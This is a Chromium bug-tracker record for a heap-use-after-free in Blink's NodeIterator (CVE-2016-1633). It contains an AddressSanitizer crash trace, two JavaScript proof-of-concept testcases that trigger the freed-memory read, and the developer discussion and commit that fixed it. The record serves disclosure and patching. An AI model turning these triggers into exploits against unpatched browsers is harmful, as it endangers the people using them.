# Security: heap-use-after-free in blink::NodeIteratorBase::root

| Field | Value |
|-------|-------|
| **Issue ID** | [40083467](https://issues.chromium.org/issues/40083467) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>DOM |
| **CVE IDs** | CVE-2016-1633 |
| **Reporter** | ni...@gmail.com |
| **Assignee** | ko...@chromium.org |
| **Created** | 2015-12-27 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**  

The testcase crashes the latest ASAN build of chrome as follows:

=================================================================  

==12700==ERROR: AddressSanitizer: heap-use-after-free on address 0x608000027040 at pc 0x000004eb9e57 bp 0x7ffc5ceb1110 sp 0x7ffc5ceb1108  

READ of size 8 at 0x608000027040 thread T0 (content\_shell)  

#0 0x4eb9e56 in get third\_party/WebKit/Source/wtf/RefPtr.h:59:43  

#1 0x4eb9e56 in blink::NodeIteratorBase::root() const third\_party/WebKit/Source/core/dom/NodeIteratorBase.h:40  

#2 0x4ff2b36 in blink::NodeIterator::updateForNodeRemoval(blink::Node&, blink::NodeIterator::NodePointer&) const third\_party/WebKit/Source/core/dom/NodeIterator.cpp:152:37  

#3 0x4ff2a35 in blink::NodeIterator::nodeWillBeRemoved(blink::Node&) third\_party/WebKit/Source/core/dom/NodeIterator.cpp:142:5  

#4 0x4ebae1c in blink::Document::nodeChildrenWillBeRemoved(blink::ContainerNode&) third\_party/WebKit/Source/core/dom/Document.cpp:3792:13  

#5 0x4e3dc27 in blink::ContainerNode::removeChildren(blink::SubtreeModificationAction) third\_party/WebKit/Source/core/dom/ContainerNode.cpp:675:9  

#6 0x5821976 in blink::ImageInputType::setUseFallbackContent() third\_party/WebKit/Source/core/html/forms/ImageInputType.cpp:265:9  

#7 0x5821836 in blink::ImageInputType::ensureFallbackContent() third\_party/WebKit/Source/core/html/forms/ImageInputType.cpp:253:5  

#8 0x552f617 in blink::loadFallbackContentForElement(blink::Element\*) third\_party/WebKit/Source/core/html/HTMLImageLoader.cpp:66:9  

#9 0x552f4c7 in blink::HTMLImageLoader::noImageResourceToLoad() third\_party/WebKit/Source/core/html/HTMLImageLoader.cpp:73:9  

#10 0x625625a in blink::ImageLoader::doUpdateFromElement(blink::ImageLoader::BypassMainWorldBehavior, blink::ImageLoader::UpdateFromElementBehavior, blink::ReferrerPolicy) third\_party/WebKit/Source/core/loader/ImageLoader.cpp:356:9  

#11 0x625c252 in blink::ImageLoader::Task::run() third\_party/WebKit/Source/core/loader/ImageLoader.cpp:115:13  

#12 0x4fa741d in blink::microtaskFunctionCallback(void\*) third\_party/WebKit/Source/core/dom/Microtask.cpp:65:5  

#13 0x3334b83 in v8::internal::Isolate::RunMicrotasks() v8/src/isolate.cc:2692:9  

#14 0x4fa702c in blink::Microtask::performCheckpoint(v8::Isolate\*) third\_party/WebKit/Source/core/dom/Microtask.cpp:52:9  

#15 0x709579b in blink::V8RecursionScope::didLeaveScriptContext() third\_party/WebKit/Source/bindings/core/v8/V8RecursionScope.cpp:39:5  

#16 0x4b196c0 in blink::V8RecursionScope::~V8RecursionScope() third\_party/WebKit/Source/bindings/core/v8/V8RecursionScope.h:75:13  

#17 0x709760a in blink::V8ScriptRunner::runCompiledScript(v8::Isolate\*, v8::Local[v8::Script](javascript:void(0);), blink::ExecutionContext\*) third\_party/WebKit/Source/bindings/core/v8/V8ScriptRunner.cpp:394:5  

#18 0x6fe0765 in blink::ScriptController::executeScriptAndReturnValue(v8::Local[v8::Context](javascript:void(0);), blink::ScriptSourceCode const&, blink::AccessControlStatus, double\*) third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:189:21  

#19 0x6fe5336 in blink::ScriptController::evaluateScriptInMainWorld(blink::ScriptSourceCode const&, blink::AccessControlStatus, blink::ScriptController::ExecuteScriptPolicy, double\*) third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:565:35  

#20 0x6fe59b7 in blink::ScriptController::executeScriptInMainWorld(blink::ScriptSourceCode const&, blink::AccessControlStatus, double\*) third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:538:5  

#21 0x51e08e8 in blink::ScriptLoader::executeScript(blink::ScriptSourceCode const&, double\*) third\_party/WebKit/Source/core/dom/ScriptLoader.cpp:421:5  

#22 0x51dc7af in blink::ScriptLoader::prepareScript(WTF::TextPosition const&, blink::ScriptLoader::LegacyTypeSupport) third\_party/WebKit/Source/core/dom/ScriptLoader.cpp:272:14  

#23 0x56f7b42 in blink::HTMLScriptRunner::runScript(blink::Element\*, WTF::TextPosition const&) third\_party/WebKit/Source/core/html/parser/HTMLScriptRunner.cpp:352:9  

#24 0x56f771e in blink::HTMLScriptRunner::execute(WTF::PassRefPtr[blink::Element](javascript:void(0);), WTF::TextPosition const&) third\_party/WebKit/Source/core/html/parser/HTMLScriptRunner.cpp:214:5  

#25 0x56bde9a in blink::HTMLDocumentParser::runScriptsForPausedTreeBuilder() third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:330:9  

#26 0x56c1b85 in blink::HTMLDocumentParser::processParsedChunkFromBackgroundParser(WTF::PassOwnPtr[blink::HTMLDocumentParser::ParsedChunk](javascript:void(0);)) third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:525:13  

#27 0x56bd561 in blink::HTMLDocumentParser::pumpPendingSpeculations() third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:586:36  

#28 0x56bd136 in blink::HTMLDocumentParser::resumeParsingAfterYield() third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:319:5  

#29 0xc354994 in blink::CancellableTaskFactory::CancellableTask::run() third\_party/WebKit/Source/platform/scheduler/CancellableTaskFactory.cpp:28:9  

#30 0x91020ee in base::internal::RunnableAdapter<void (\*)(scoped\_ptr<blink::WebTaskRunner::Task, std::\_\_1::default\_delete[blink::WebTaskRunner::Task](javascript:void(0);) >)>::Run(scoped\_ptr<blink::WebTaskRunner::Task, std::\_\_1::default\_delete[blink::WebTaskRunner::Task](javascript:void(0);) >) base/bind\_internal.h:155:12  

#31 0x9101f17 in base::internal::InvokeHelper<false, void, base::internal::RunnableAdapter<void (\*)(scoped\_ptr<blink::WebTaskRunner::Task, std::\_\_1::default\_delete[blink::WebTaskRunner::Task](javascript:void(0);) >)>, base::internal::TypeList<scoped\_ptr<blink::WebTaskRunner::Task, std::\_\_1::default\_delete[blink::WebTaskRunner::Task](javascript:void(0);) > > >::MakeItSo(base::internal::RunnableAdapter<void (\*)(scoped\_ptr<blink::WebTaskRunner::Task, std::\_\_1::default\_delete[blink::WebTaskRunner::Task](javascript:void(0);) >)>, scoped\_ptr<blink::WebTaskRunner::Task, std::\_\_1::default\_delete[blink::WebTaskRunner::Task](javascript:void(0);) >) base/bind\_internal.h:295:5  

#32 0x9101db3 in base::internal::Invoker<base::IndexSequence<0ul>, base::internal::BindState<base::internal::RunnableAdapter<void (\*)(scoped\_ptr<blink::WebTaskRunner::Task, std::\_\_1::default\_delete[blink::WebTaskRunner::Task](javascript:void(0);) >)>, void (scoped\_ptr<blink::WebTaskRunner::Task, std::\_\_1::default\_delete[blink::WebTaskRunner::Task](javascript:void(0);) >), base::internal::PassedWrapper<scoped\_ptr<blink::WebTaskRunner::Task, std::\_\_1::default\_delete[blink::WebTaskRunner::Task](javascript:void(0);) > > >, base::internal::TypeList<base::internal::UnwrapTraits<base::internal::PassedWrapper<scoped\_ptr<blink::WebTaskRunner::Task, std::\_\_1::default\_delete[blink::WebTaskRunner::Task](javascript:void(0);) > > > >, base::internal::InvokeHelper<false, void, base::internal::RunnableAdapter<void (\*)(scoped\_ptr<blink::WebTaskRunner::Task, std::\_\_1::default\_delete[blink::WebTaskRunner::Task](javascript:void(0);) >)>, base::internal::TypeList<scoped\_ptr<blink::WebTaskRunner::Task, std::\_\_1::default\_delete[blink::WebTaskRunner::Task](javascript:void(0);) > > >, void ()>::Run(base::internal::BindStateBase\*) base/bind\_internal.h:345:12  

#33 0x7f5d07 in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask const&) base/debug/task\_annotator.cc:51:3  

#34 0x91206b7 in scheduler::TaskQueueManager::ProcessTaskFromWorkQueue(scheduler::internal::WorkQueue\*, scheduler::internal::TaskQueueImpl::Task\*) components/scheduler/base/task\_queue\_manager.cc:264:3  

#35 0x911d3be in scheduler::TaskQueueManager::DoWork(base::TimeTicks, bool) components/scheduler/base/task\_queue\_manager.cc:180:13  

#36 0x912350a in base::internal::InvokeHelper<true, void, base::internal::RunnableAdapter<void (scheduler::TaskQueueManager::\*)(base::TimeTicks, bool)>, base::internal::TypeList<base::WeakPtr[scheduler::TaskQueueManager](javascript:void(0);) const&, base::TimeTicks const&, bool const&> >::MakeItSo(base::internal::RunnableAdapter<void (scheduler::TaskQueueManager::\*)(base::TimeTicks, bool)>, base::WeakPtr[scheduler::TaskQueueManager](javascript:void(0);) const&, base::TimeTicks const&, bool const&) base/bind\_internal.h:305:5  

#37 0x7f5d07 in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask const&) base/debug/task\_annotator.cc:51:3  

#38 0x6a68a9 in base::MessageLoop::RunTask(base::PendingTask const&) base/message\_loop/message\_loop.cc:487:3  

#39 0x6a763d in base::MessageLoop::DeferOrRunPendingTask(base::PendingTask const&) base/message\_loop/message\_loop.cc:496:5  

#40 0x6a7ce2 in base::MessageLoop::DoWork() base/message\_loop/message\_loop.cc:608:13  

#41 0x6b54c5 in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) base/message\_loop/message\_pump\_default.cc:32:21  

#42 0x6a5d85 in base::MessageLoop::RunHandler() base/message\_loop/message\_loop.cc:451:3  

#43 0x6ebbb4 in base::RunLoop::Run() base/run\_loop.cc:55:3  

#44 0x6a33d8 in base::MessageLoop::Run() base/message\_loop/message\_loop.cc:289:3  

#45 0x928f0ce in content::RendererMain(content::MainFunctionParams const&) content/renderer/renderer\_main.cc:232:7  

#46 0x623888 in content::RunZygote(content::MainFunctionParams const&, content::ContentMainDelegate\*) content/app/content\_main\_runner.cc:307:14  

#47 0x6247e0 in content::RunNamedProcessTypeMain(std::\_\_1::basic\_string<char, std::\_\_1::char\_traits<char>, std::\_\_1::allocator<char> > const&, content::MainFunctionParams const&, content::ContentMainDelegate\*) content/app/content\_main\_runner.cc:391:12  

#48 0x627611 in content::ContentMainRunnerImpl::Run() content/app/content\_main\_runner.cc:795:12  

#49 0x622931 in content::ContentMain(content::ContentMainParams const&) content/app/content\_main.cc:19:15  

#50 0x4fab4a in main content/shell/app/shell\_main.cc:50:10  

#51 0x7f3265a0da3f in \_\_libc\_start\_main /build/buildd/glibc-2.21/csu/libc-start.c:289

0x608000027040 is located 32 bytes inside of 88-byte region [0x608000027020,0x608000027078)  

freed by thread T0 (content\_shell) here:  

#0 0x4d02fb in \_\_interceptor\_free (/home/nils/MonkeyChrome/OpRealEstate/asan-symbolized-linux-release-366905/content\_shell+0x4d02fb)  

#1 0x70ce558 in WTF::RefCounted[blink::NodeIterator](javascript:void(0);)::deref() third\_party/WebKit/Source/wtf/RefCounted.h:176:13  

#2 0x4eeb485 in blink::WrapperTypeInfo::derefObject(blink::ScriptWrappable\*) const third\_party/WebKit/Source/bindings/core/v8/WrapperTypeInfo.h:157:13  

#3 0x31ac6c5 in v8::internal::GlobalHandles::PendingPhantomCallback::Invoke(v8::internal::Isolate\*) v8/src/global-handles.cc:967:3  

#4 0x31ac385 in v8::internal::GlobalHandles::InvokeSecondPassPhantomCallbacks(v8::internal::List<v8::internal::GlobalHandles::PendingPhantomCallback, v8::internal::FreeStoreAllocationPolicy>\*, v8::internal::Isolate\*) v8/src/global-handles.cc:822:5  

#5 0x31ae255 in v8::internal::GlobalHandles::DispatchPendingPhantomCallbacks(bool) v8/src/global-handles.cc:941:7  

#6 0x31ae82b in v8::internal::GlobalHandles::PostGarbageCollectionProcessing(v8::internal::GarbageCollector, v8::GCCallbackFlags) v8/src/global-handles.cc:988:18  

#7 0x31c85b9 in v8::internal::Heap::PerformGarbageCollection(v8::internal::GarbageCollector, v8::GCCallbackFlags) v8/src/heap/heap.cc:1300:9  

#8 0x31c6d0f in v8::internal::Heap::CollectGarbage(v8::internal::GarbageCollector, char const\*, char const\*, v8::GCCallbackFlags) v8/src/heap/heap.cc:976:11  

#9 0x2c5c2a1 in v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, char const\*, v8::GCCallbackFlags) v8/src/heap/heap-inl.h:532:10  

#10 0x31c546e in v8::internal::Heap::CollectAllGarbage(int, char const\*, v8::GCCallbackFlags) v8/src/heap/heap.cc:833:3  

#11 0x2c5c0ee in v8::Isolate::RequestGarbageCollectionForTesting(v8::Isolate::GarbageCollectionType) v8/src/api.cc:7140:5  

#12 0x38ab9c1 in v8::internal::FunctionCallbackArguments::Call(void (\*)(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&)) v8/src/arguments.cc:33:3  

#13 0x2cfec05 in v8::internal::MaybeHandle[v8::internal::Object](javascript:void(0);) v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate\*, v8::internal::(anonymous namespace)::BuiltinArguments<(v8::internal::BuiltinExtraArguments)1>) v8/src/builtins.cc:2156:34  

#14 0x2d2c0a3 in v8::internal::Builtin\_Impl\_HandleApiCall(v8::internal::(anonymous namespace)::BuiltinArguments<(v8::internal::BuiltinExtraArguments)1>, v8::internal::Isolate\*) v8/src/builtins.cc:2180:3  

#15 0x2d020df in v8::internal::Builtin\_HandleApiCall(int, v8::internal::Object\*\*, v8::internal::Isolate\*) v8/src/builtins.cc:2177:1  

#16 0x7f30ec30c3ba (<unknown module>)  

#17 0x7f30ec33b9c8 (<unknown module>)  

#18 0x7f30ec33a79b (<unknown module>)  

#19 0x7f30ec3349a3 (<unknown module>)  

#20 0x7f30ec319c21 (<unknown module>)  

#21 0x310c3bf in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate\*, bool, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);)) v8/src/execution.cc:98:13  

#22 0x310b4ec in v8::internal::Execution::Call(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*) v8/src/execution.cc:164:10  

#23 0x2c0be43 in v8::Script::Run(v8::Local[v8::Context](javascript:void(0);)) v8/src/api.cc:1716:23  

#24 0x70975ef in blink::V8ScriptRunner::runCompiledScript(v8::Isolate\*, v8::Local[v8::Script](javascript:void(0);), blink::ExecutionContext\*) third\_party/WebKit/Source/bindings/core/v8/V8ScriptRunner.cpp:392:18  

#25 0x6fe0765 in blink::ScriptController::executeScriptAndReturnValue(v8::Local[v8::Context](javascript:void(0);), blink::ScriptSourceCode const&, blink::AccessControlStatus, double\*) third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:189:21  

#26 0x6fe5336 in blink::ScriptController::evaluateScriptInMainWorld(blink::ScriptSourceCode const&, blink::AccessControlStatus, blink::ScriptController::ExecuteScriptPolicy, double\*) third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:565:35  

#27 0x6fe59b7 in blink::ScriptController::executeScriptInMainWorld(blink::ScriptSourceCode const&, blink::AccessControlStatus, double\*) third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:538:5  

#28 0x51e08e8 in blink::ScriptLoader::executeScript(blink::ScriptSourceCode const&, double\*) third\_party/WebKit/Source/core/dom/ScriptLoader.cpp:421:5  

#29 0x51dc7af in blink::ScriptLoader::prepareScript(WTF::TextPosition const&, blink::ScriptLoader::LegacyTypeSupport) third\_party/WebKit/Source/core/dom/ScriptLoader.cpp:272:14

previously allocated by thread T0 (content\_shell) here:  

#0 0x4d061b in **interceptor\_malloc (/home/nils/MonkeyChrome/OpRealEstate/asan-symbolized-linux-release-366905/content\_shell+0x4d061b)  

#1 0x290b2ba in partitionAllocGenericFlags third\_party/WebKit/Source/wtf/PartitionAlloc.h:736:20  

#2 0x290b2ba in partitionAllocGeneric third\_party/WebKit/Source/wtf/PartitionAlloc.h:763  

#3 0x290b2ba in WTF::Partitions::fastMalloc(unsigned long, char const\*) third\_party/WebKit/Source/wtf/Partitions.h:108  

#4 0x4e94529 in blink::NodeIterator::create(WTF::PassRefPtr[blink::Node](javascript:void(0);), unsigned int, WTF::PassRefPtr[blink::NodeFilter](javascript:void(0);)) third\_party/WebKit/Source/core/dom/NodeIterator.h:45:35  

#5 0x4e942a6 in blink::Document::createNodeIterator(blink::Node\*, unsigned int, WTF::PassRefPtr[blink::NodeFilter](javascript:void(0);)) third\_party/WebKit/Source/core/dom/Document.cpp:1469:12  

#6 0x74a54d8 in blink::DocumentV8Internal::createNodeIteratorMethod(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&) /mnt/data/b/build/slave/ASAN\_Release\_\_symbolized*/build/src/out/Release/gen/blink/bindings/core/v8/V8Document.cpp:4433:44  

#7 0x749e316 in blink::DocumentV8Internal::createNodeIteratorMethodCallback(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&) /mnt/data/b/build/slave/ASAN\_Release\_\_symbolized*/build/src/out/Release/gen/blink/bindings/core/v8/V8Document.cpp:4439:5  

#8 0x38ab9c1 in v8::internal::FunctionCallbackArguments::Call(void (\*)(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&)) v8/src/arguments.cc:33:3  

#9 0x2cfec05 in v8::internal::MaybeHandle[v8::internal::Object](javascript:void(0);) v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate\*, v8::internal::(anonymous namespace)::BuiltinArguments<(v8::internal::BuiltinExtraArguments)1>) v8/src/builtins.cc:2156:34  

#10 0x2d2c0a3 in v8::internal::Builtin\_Impl\_HandleApiCall(v8::internal::(anonymous namespace)::BuiltinArguments<(v8::internal::BuiltinExtraArguments)1>, v8::internal::Isolate\*) v8/src/builtins.cc:2180:3  

#11 0x2d020df in v8::internal::Builtin\_HandleApiCall(int, v8::internal::Object\*\*, v8::internal::Isolate\*) v8/src/builtins.cc:2177:1  

#12 0x7f30ec30c3ba (<unknown module>)  

#13 0x7f30ec33b551 (<unknown module>)  

#14 0x7f30ec33a79b (<unknown module>)  

#15 0x7f30ec3349a3 (<unknown module>)  

#16 0x7f30ec319c21 (<unknown module>)  

#17 0x310c3bf in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate\*, bool, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);)) v8/src/execution.cc:98:13  

#18 0x310b4ec in v8::internal::Execution::Call(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*) v8/src/execution.cc:164:10  

#19 0x2c0be43 in v8::Script::Run(v8::Local[v8::Context](javascript:void(0);)) v8/src/api.cc:1716:23  

#20 0x70975ef in blink::V8ScriptRunner::runCompiledScript(v8::Isolate\*, v8::Local[v8::Script](javascript:void(0);), blink::ExecutionContext\*) third\_party/WebKit/Source/bindings/core/v8/V8ScriptRunner.cpp:392:18  

#21 0x6fe0765 in blink::ScriptController::executeScriptAndReturnValue(v8::Local[v8::Context](javascript:void(0);), blink::ScriptSourceCode const&, blink::AccessControlStatus, double\*) third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:189:21  

#22 0x6fe5336 in blink::ScriptController::evaluateScriptInMainWorld(blink::ScriptSourceCode const&, blink::AccessControlStatus, blink::ScriptController::ExecuteScriptPolicy, double\*) third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:565:35  

#23 0x6fe59b7 in blink::ScriptController::executeScriptInMainWorld(blink::ScriptSourceCode const&, blink::AccessControlStatus, double\*) third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:538:5  

#24 0x51e08e8 in blink::ScriptLoader::executeScript(blink::ScriptSourceCode const&, double\*) third\_party/WebKit/Source/core/dom/ScriptLoader.cpp:421:5  

#25 0x51dc7af in blink::ScriptLoader::prepareScript(WTF::TextPosition const&, blink::ScriptLoader::LegacyTypeSupport) third\_party/WebKit/Source/core/dom/ScriptLoader.cpp:272:14  

#26 0x56f7b42 in blink::HTMLScriptRunner::runScript(blink::Element\*, WTF::TextPosition const&) third\_party/WebKit/Source/core/html/parser/HTMLScriptRunner.cpp:352:9  

#27 0x56f771e in blink::HTMLScriptRunner::execute(WTF::PassRefPtr[blink::Element](javascript:void(0);), WTF::TextPosition const&) third\_party/WebKit/Source/core/html/parser/HTMLScriptRunner.cpp:214:5  

#28 0x56bde9a in blink::HTMLDocumentParser::runScriptsForPausedTreeBuilder() third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:330:9  

#29 0x56c1b85 in blink::HTMLDocumentParser::processParsedChunkFromBackgroundParser(WTF::PassOwnPtr[blink::HTMLDocumentParser::ParsedChunk](javascript:void(0);)) third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:525:13  

#30 0x56bd561 in blink::HTMLDocumentParser::pumpPendingSpeculations() third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:586:36  

#31 0x56bd136 in blink::HTMLDocumentParser::resumeParsingAfterYield() third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:319:5

SUMMARY: AddressSanitizer: heap-use-after-free third\_party/WebKit/Source/wtf/RefPtr.h:59:43 in get  

Shadow bytes around the buggy address:  

0x0c107fffcdb0: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 fa  

0x0c107fffcdc0: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 fa  

0x0c107fffcdd0: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 fa  

0x0c107fffcde0: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 fa  

0x0c107fffcdf0: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 fa  

=>0x0c107fffce00: fa fa fa fa fd fd fd fd[fd]fd fd fd fd fd fd fa  

0x0c107fffce10: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00  

0x0c107fffce20: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fa  

0x0c107fffce30: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 04 fa  

0x0c107fffce40: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c107fffce50: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fa  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Heap right redzone: fb  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack partial redzone: f4  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

Left alloca redzone: ca  

Right alloca redzone: cb  

==12700==ABORTING

**VERSION**  

Chrome Version: asan-symbolized-linux-release-366905  

Operating System: linux 64-bit

**REPRODUCTION CASE**  

requires --js-flags=--expose-gc

<script>
function start() {
o172=document.createElement('a');
o390=document.createElement('u');
try{o172.insertAdjacentHTML('beforebegin','')}catch(e){}
o461=document.importNode(o172,true);
o390.appendChild(o461);
o390=null;
o893=o461.parentElement;
document.documentElement.appendChild(o893);
o910=document.createElement('input');
o461.appendChild(o910);
o910.type='image';
document.execCommand('inserthtml',false,'');
o1050=document.createElement('meta');
document.documentElement.innerHTML='';
o1104=document.createElement('table');
document.body.appendChild(o1104);
o1050.contentEditable=false;
o1189=document.createElement('input');
o1104.appendChild(o1189);
o1050.setAttribute('dir','rtl');
o1291=o1189.createShadowRoot();
o1291.appendChild(o1050);
o1416=o1050.attributes[1];
o1050.removeAttribute(o1416.name);
document.createNodeIterator(o1416, 487380955);
o1559=document.createElement('s');
o1716=document.implementation.createDocument('', '', null).implementation.createDocument('', '', null);
o1724=document.createElement('t');
o1716.appendChild(o1724);
o1716.appendChild(document.replaceChild(o1716.documentElement,document.documentElement));
gc();
}
start();
</script>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab

## Timeline

### cl...@chromium.org (2015-12-28)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://cluster-fuzz.appspot.com/testcase?key=5654703125299200

### cl...@chromium.org (2015-12-28)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-12-28)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5654703125299200

Uploader: inferno@chromium.org
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x60e00003f7a0
Crash State:
  blink::NodeIterator::updateForNodeRemoval
  blink::NodeIterator::nodeWillBeRemoved
  blink::Document::nodeChildrenWillBeRemoved
  
Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=307479:307632

Minimized Testcase (1.04 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv94xUx77xC_xTlcKlbQXnsvrjkmJtk8tjHUgl5eSjMPwxBNHOlRy7Z7BTtRdnzqhBIGbbasWebIji9q6djUFwDP7jE3uLQjwWWYlAN1EzENyEJM8jEdloYg664TBoVpTnIw407ihb0gXuAWsjCvJv8Arr1DNTA
<script>
	o172=document.createElement('a');
	o390=document.createElement('u');
	o461=document.importNode(o172);
	o390.appendChild(o461);
	o893=o461.parentElement;
	document.documentElement.appendChild(o893);
	o910=document.createElement('input');
	o461.appendChild(o910);
	o910.type='image';
	document.execCommand('');
	o1050=document.createElement('meta');
	document.documentElement.innerHTML='';
	o1104=document.createElement('table');
	document.body.appendChild(o1104);
	o1050.contentEditable=false;
	o1189=document.createElement('input');
	o1104.appendChild(o1189);
	o1050.setAttribute('dir','rtl');
	o1291=o1189.createShadowRoot();
	o1291.appendChild(o1050);
	o1416=o1050.attributes[1];
	o1050.removeAttribute(o1416.name);
	document.createNodeIterator(o1416);
	o1716=document.implementation.createDocument( '', null).implementation.createDocument( '', null);
	o1724=document.createElement('t');
	o1716.appendChild(o1724);
	o1716.appendChild(document.replaceChild(o1716.documentElement,document.documentElement));
	gc();
</script>


See https://dev.chromium.org/Home/chromium-security/bugs/reproducing-clusterfuzz-bugs for more information.

### in...@chromium.org (2015-12-28)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-12-28)

[Empty comment from Monorail migration]

### ti...@google.com (2015-12-29)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-01-11)

kouhei@: Uh oh! This issue is still open and hasn't been updated in the last 14 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### ko...@chromium.org (2016-01-12)

[Empty comment from Monorail migration]

### ko...@chromium.org (2016-01-12)

CL: https://codereview.chromium.org/1577213003/

### ko...@chromium.org (2016-01-14)

After discussion with haraken@, we would like to delegate this bug to HTML DOM team.
We came up with a tentative fix as in #9, but underlying issue is that Document::m_nodeIterators bookkeeping is fundamentally broken and the CL is only workaround of a certain case.

To *correctly* fix this issue, we need to ensure the Document::m_nodeIterators bookkeeping is always correct. For example, we need to remove weird situation such as:
https://code.google.com/p/chromium/codesearch#chromium/src/third_party/WebKit/Source/core/dom/Document.cpp&sq=package:chromium&type=cs&l=3756&rcl=1452587427

### ri...@chromium.org (2016-01-14)

Hi, kouhei, do you know who from the HTML DOM team would be a good person to take over this bug then?

### ko...@chromium.org (2016-01-14)

tkent, dominicc: Would you take a look/triage this issue?

### tk...@chromium.org (2016-01-14)

The approach of https://codereview.chromium.org/1577213003/ looks right to me.  Would you continue to work on this please?
This issue must be specific to Attr.



### bu...@chromium.org (2016-01-15)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/eb750a539e4856ba9042abdf39ae9da58fa3ae63

commit eb750a539e4856ba9042abdf39ae9da58fa3ae63
Author: kouhei <kouhei@chromium.org>
Date: Fri Jan 15 05:22:22 2016

Fix detached Attr nodes interaction with NodeIterator

- Don't register NodeIterator to document when attaching to Attr node.
-- NodeIterator is registered to its document to receive updateForNodeRemoval notifications.
-- However it wouldn't make sense on Attr nodes, as they never have children.

BUG=572537

Review URL: https://codereview.chromium.org/1577213003

Cr-Commit-Position: refs/heads/master@{#369687}

[add] http://crrev.com/eb750a539e4856ba9042abdf39ae9da58fa3ae63/third_party/WebKit/LayoutTests/fast/dom/NodeIterator/NodeIterator-attr.html
[modify] http://crrev.com/eb750a539e4856ba9042abdf39ae9da58fa3ae63/third_party/WebKit/Source/core/dom/NodeIterator.cpp


### in...@chromium.org (2016-01-15)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-01-15)

Adding Merge-Triage label for tracking purposes.

Once your fix had sufficient bake time (on canary, dev as appropriate), please nominate your fix for merge by adding the Merge-Requested label.

When your merge is approved by the release manager, please start merging with higher milestone label first. Make sure to re-request merge for every milestone in the label list. You can get branch information on omahaproxy.appspot.com.

- Your friendly ClusterFuzz

### cl...@chromium.org (2016-01-16)

ClusterFuzz has detected this issue as fixed in range 369666:369695.

